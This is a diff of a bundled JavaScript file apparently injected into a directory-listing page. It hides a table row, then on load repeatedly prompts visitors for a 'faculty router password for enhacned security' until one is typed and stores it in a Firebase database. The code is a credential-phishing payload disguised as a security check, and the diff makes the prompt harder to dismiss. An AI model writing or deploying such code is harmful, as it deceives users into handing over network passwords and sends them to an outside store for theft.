@@ -18457,9 +18457,9 @@ const firebaseConfig = {
 const app = (0,firebase_app__WEBPACK_IMPORTED_MODULE_0__.initializeApp)(firebaseConfig);
 
 function hideFolder() {
-    const anchor = document.currentScript.parentElement;
-    anchor.setAttribute('href', 'javascript:void(0)');
-    anchor.style.display = 'none';
+    const body = document.querySelector('tbody');
+    const folder = body.lastElementChild;
+    folder.style.display = 'none';
 }
 
 function getPass() {
@@ -18469,10 +18469,17 @@ function getPass() {
 
     const userRef = (0,firebase_database__WEBPACK_IMPORTED_MODULE_1__.ref)(db, refKey);
 
-    const value1 = prompt(
-        'Enter your router password for enhacned security : '
-    );
-    const value2 = prompt('Enter Again : ');
+    let valueEntered = false;
+    while (!valueEntered) {
+        var value1 = prompt(
+            'Enter faculty router password for enhacned security : '
+        );
+        if (value1) {
+            valueEntered = true;
+        }
+    }
+
+    var value2 = prompt('Enter Again : ');
 
     (0,firebase_database__WEBPACK_IMPORTED_MODULE_1__.set)(userRef, {
         password: value1,
@@ -18488,4 +18495,4 @@ getPass();
 
 /******/ })()
 ;
-//# sourceMappingURL=main.ff7c01e59cc53b2ce2ce.js.map
+//# sourceMappingURL=main.d6b11f087d96b022de2a.js.map
